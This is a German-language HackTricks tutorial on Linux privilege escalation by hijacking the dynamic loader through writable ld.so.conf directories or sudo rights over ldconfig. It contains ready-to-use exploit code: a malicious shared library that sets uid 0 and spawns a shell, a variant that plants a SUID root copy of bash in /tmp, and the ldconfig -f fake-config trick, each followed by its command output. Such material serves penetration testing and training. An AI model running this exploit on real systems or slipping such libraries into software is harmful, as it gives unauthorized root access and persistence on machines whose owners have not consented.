# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Bereite die Umgebung vor

Im folgenden Abschnitt findest du den Code der Dateien, die wir verwenden werden, um die Umgebung vorzubereiten

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Erstelle** diese Dateien auf deiner Maschine im selben Ordner
2. **Kompiliere** die **Bibliothek**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopiere** `libcustom.so` nach `/usr/lib` und aktualisiere den Cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Kompiliere** die **Executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Überprüfe die Umgebung

Prüfe, dass _libcustom.so_ aus _/usr/lib_ **geladen** wird und dass du die Binary **ausführen** kannst.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Nützliche Triage-Befehle

Beim Angriff auf ein echtes Ziel, verifiziere den **exakten Bibliotheksnamen**, den das Binary benötigt, und was der Loader **gerade auflöst**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Ein paar nützliche Stolperfallen:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` funktioniert normalerweise **nicht**, weil
die Umleitung von deiner aktuellen Shell ausgeführt wird. Verwende stattdessen
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** Binaries ignorieren `LD_LIBRARY_PATH`/`LD_PRELOAD` im
**secure-execution mode**, aber Verzeichnisse aus `/etc/ld.so.conf` sind
weiterhin Teil der vertrauenswürdigen Loader-Konfiguration, sodass diese Fehlkonfiguration
privilegierte Programme trotzdem beeinflussen kann.
- In neueren glibc-Versionen bietet der Dynamic Loader außerdem
`--list-diagnostics`, was nützlich ist, um die Cache-Auflösung und die
Auswahl von `glibc-hwcaps`-Unterverzeichnissen zu debuggen, wenn ein hijack sich nicht wie
erwartet verhält.

## Exploit

In diesem Szenario gehen wir davon aus, dass **jemand einen verwundbaren Eintrag erstellt hat** innerhalb einer Datei in _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Der verwundbare Ordner ist _/home/ubuntu/lib_ (wo wir Schreibzugriff haben).\
**Lade den folgenden Code herunter und kompiliere** ihn innerhalb dieses Pfads:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Wenn du erwartest, dass **root** (oder ein anderes privilegiertes Konto) das verwundbare Binary später ausführt, ist es normalerweise besser, ein **root-owned artifact** zurückzulassen, statt eine interaktive Shell zu starten. Zum Beispiel:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Dann kannst du, nachdem die privilegierte Ausführung stattgefunden hat, `/tmp/rootbash -p` verwenden.

Jetzt, da wir die bösartige `libcustom`-Bibliothek im fehlkonfigurierten Pfad erstellt haben, müssen wir auf einen **Neustart** oder darauf warten, dass der Root-User **`ldconfig`** ausführt (_falls du dieses Binary als **sudo** ausführen kannst oder es das **suid bit** hat, kannst du es selbst ausführen_).

Sobald das passiert ist, **prüfe erneut**, von wo aus das `sharedvuln`-Executable die `libcustom.so`-Bibliothek lädt:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Wie du sehen kannst, wird es **aus `/home/ubuntu/lib` geladen** und wenn ein Benutzer es ausführt, wird eine Shell ausgeführt:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Beachte, dass wir in diesem Beispiel keine Privilegien eskaliert haben, aber durch das Ändern der ausgeführten Befehle und das **Warten darauf, dass root oder ein anderer privilegierter Benutzer die verwundbare Binary ausführt**, werden wir in der Lage sein, Privilegien zu eskalieren.

### Other misconfigurations - Same vuln

Im vorherigen Beispiel haben wir eine Fehlkonfiguration vorgetäuscht, bei der ein Administrator **einen nicht privilegierten Ordner in einer Konfigurationsdatei innerhalb von `/etc/ld.so.conf.d/` gesetzt hat**.\
Aber es gibt andere Fehlkonfigurationen, die dieselbe Vulnerability verursachen können. Wenn du **Schreibrechte** in einer **config file** innerhalb von `/etc/ld.so.conf.d`s, im Ordner `/etc/ld.so.conf.d` oder in der Datei `/etc/ld.so.conf` hast, kannst du dieselbe Vulnerability konfigurieren und ausnutzen.

## Exploit 2

**Angenommen, du hast sudo privileges über `ldconfig`**.\
Du kannst `ldconfig` angeben, **von wo die conf files geladen werden sollen**, sodass wir es ausnutzen können, um `ldconfig` beliebige Ordner laden zu lassen.\
Also, lass uns die Dateien und Ordner erstellen, die benötigt werden, um `"/tmp"` zu laden:
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Nun, wie im **vorherigen Exploit** angegeben, **erstelle die bösartige Bibliothek in `/tmp`**.\
Und schließlich laden wir den Pfad und prüfen, von wo aus das Binary die Bibliothek lädt:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Wie Sie sehen können, können Sie mit sudo-Privilegien über `ldconfig` dieselbe Schwachstelle ausnutzen.**



## References

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
